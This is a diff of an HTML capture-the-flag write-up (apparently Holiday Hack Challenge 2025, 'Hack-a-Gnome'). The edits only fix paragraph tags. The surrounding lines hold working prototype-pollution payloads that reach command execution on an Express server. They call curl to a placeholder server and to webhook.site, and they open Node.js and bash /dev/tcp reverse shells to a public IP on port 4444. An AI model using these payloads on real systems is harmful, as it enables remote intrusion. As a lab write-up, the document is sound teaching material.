@@ -258,6 +258,7 @@ Prototype pollution is possible. Server Headers indicate “Express” which is 
 <p>
 This is the payload:
 <br>
+</p>
 <pre><code class="language-">
 {
   "action": "update",
@@ -266,26 +267,20 @@ This is the payload:
   "value": "x;process.mainModule.require('child_process').execSync('curl http://YOUR-SERVER');s"
 }
 </code></pre>
-<br>
-</p>
 <p>
 URL Encoded:
 <br>
+</p>
 <pre><code class="language-">
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20http%3A%2F%2FYOUR-SERVER')%3Bs%22%7D
 </code></pre>
-<br>
-</p>
 <p>
 Payload that uses webhook.site as a sensor:
 <br>
 </p>
 <pre><code class="language-">
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20https%3A%2F%2Fwebhook.site%2Ff3bc21bc-b85f-4bb1-9bf2-bd4ac5767b96')%3Bs%22%7D
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 Webhook detects the connection:
 <br>
@@ -297,6 +292,7 @@ Webhook detects the connection:
 <p>
 Weaponizing with Node.JS reverse shell:
 <br>
+</p>
 <pre><code class="language-">
 {
   "action": "update",
@@ -305,8 +301,6 @@ Weaponizing with Node.JS reverse shell:
   "value": "x;require('child_process').exec('node -e \\'require(\"net\").connect({port:4444,host:\"173.255.237.30 \"},function(){this.pipe(require(\"child_process\").spawn(\"/bin/sh\",[]).stdin);require(\"child_process\").spawn(\"/bin/sh\",[]).stdout.pipe(this);})\\'');s"
 }
 </code></pre>
-<br>
-</p>
 <p>
 Setup a linode linux system with a public IP and a listener on port 4444 to catch the shell.
 <br>
@@ -314,11 +308,10 @@ Setup a linode linux system with a public IP and a listener on port 4444 to catc
 <p>
 The message payload for the shell:
 <br>
+</p>
 <pre><code class="language-">
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F173.255.237.30%2F4444%200%3E%261%5C%22')%3Bs%22%7D
 </code></pre>
-<br>
-</p>
 <p>
 <img src="/HHC_2025/images/hack-a-gnome_reverseshell.jpg" alt="Hack-a-Gnome Reverse Shell">
 <br>
@@ -336,10 +329,7 @@ sed -i 's/0x244/0x200/g' canbus_client.py   # up
 sed -i 's/0x245/0x201/g' canbus_client.py   # down
 sed -i 's/0x246/0x202/g' canbus_client.py   # left
 sed -i 's/0x247/0x203/g' canbus_client.py   # right
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 Trial and error reveals the codes:
 <br>
